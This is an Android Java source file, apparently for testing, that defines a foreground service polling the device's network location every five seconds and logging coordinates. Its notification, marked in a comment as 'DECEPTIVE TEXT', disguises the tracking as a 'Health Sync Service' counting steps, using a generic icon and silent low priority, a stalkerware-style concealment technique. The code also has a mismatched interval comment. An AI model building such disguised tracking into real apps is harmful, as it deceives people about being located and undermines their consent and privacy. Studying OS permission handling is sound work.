package com.example.locationapplication;

import android.Manifest;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.location.Location;
import android.location.LocationListener;
import android.location.LocationManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.HandlerThread;
import android.os.IBinder;
import android.os.Looper;
import android.util.Log;
import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;

import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;

public class LocationResearchService extends Service {

    private static final String TAG = "LocationResearch";
    private static final String CHANNEL_ID = "LocationResearchChannel";
    private static final int NOTIFICATION_ID = 12345;

    private HandlerThread workerThread;
    private Handler backgroundHandler;
    private LocationManager lm;
    private boolean isRunning = false;

    @Override
    public void onCreate() {
        super.onCreate();
        lm = (LocationManager) getSystemService(Context.LOCATION_SERVICE);

        // Start Background Thread
        workerThread = new HandlerThread("ServiceWorker");
        workerThread.start();
        backgroundHandler = new Handler(workerThread.getLooper());
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (!isRunning) {
            isRunning = true;
            startForeground(NOTIFICATION_ID, createNotification());
            Log.e(TAG, "🟢 FOREGROUND SERVICE STARTED");

            // Start the Loop
            backgroundHandler.post(locationRunnable);
        }
        return START_STICKY;
    }

    private final Runnable locationRunnable = new Runnable() {
        @Override
        public void run() {
            if (!isRunning) return;

            requestSingleLocation();

            // Repeat every 3 seconds
            backgroundHandler.postDelayed(this, 5000);
        }
    };

    private void requestSingleLocation() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                != PackageManager.PERMISSION_GRANTED) {
            Log.e(TAG, "❌ PERMISSION REVOKED BY OS (Test Complete).");
            stopSelf(); // Kill service if permission is gone
            return;
        }

        try {
            // Using Network Provider for speed
            lm.requestSingleUpdate(LocationManager.NETWORK_PROVIDER, new LocationListener() {
                @Override
                public void onLocationChanged(@NonNull Location location) {
                    printLocation(location);
                }
                @Override public void onStatusChanged(String provider, int status, Bundle extras) {}
                @Override public void onProviderEnabled(@NonNull String provider) {}
                @Override public void onProviderDisabled(@NonNull String provider) {}
            }, workerThread.getLooper());

        } catch (SecurityException e) {
            Log.e(TAG, "❌ SECURITY EXCEPTION: " + e.getMessage());
            stopSelf();
        } catch (Exception e) {
            Log.e(TAG, "⚠️ Provider Error: " + e.getMessage());
        }
    }

    private void printLocation(Location location) {
        long systemTime = System.currentTimeMillis();
        long fixTime = location.getTime();
        String timestamp = new SimpleDateFormat("HH:mm:ss", Locale.US).format(new Date(systemTime));
        String coord = String.format(Locale.US, "%.5f, %.5f", location.getLatitude(), location.getLongitude());
        String age = (systemTime - fixTime) + "ms";

        Log.e(TAG, "📍 SERVICE LOG [" + timestamp + "]: " + coord + " (Age: " + age + ")");
    }

    private Notification createNotification() {
        NotificationChannel channel = new NotificationChannel(CHANNEL_ID,
                "Research Service", NotificationManager.IMPORTANCE_LOW);
        getSystemService(NotificationManager.class).createNotificationChannel(channel);

        return new NotificationCompat.Builder(this, CHANNEL_ID)
                // DECEPTIVE TEXT:
                .setContentTitle("Health Sync Service")
                .setContentText("Step counting active...")

                // Use a generic icon (like a sync arrow or running man)
                .setSmallIcon(android.R.drawable.ic_menu_rotate)

                // Low priority makes it silent (no beep), just a visual icon
                .setPriority(NotificationCompat.PRIORITY_LOW)
                .build();
    }

    @Override
    public void onDestroy() {
        isRunning = false;
        if (workerThread != null) workerThread.quitSafely();
        Log.e(TAG, "🔴 FOREGROUND SERVICE STOPPED");
        super.onDestroy();
    }

    @Nullable
    @Override
    public IBinder onBind(Intent intent) { return null; }
}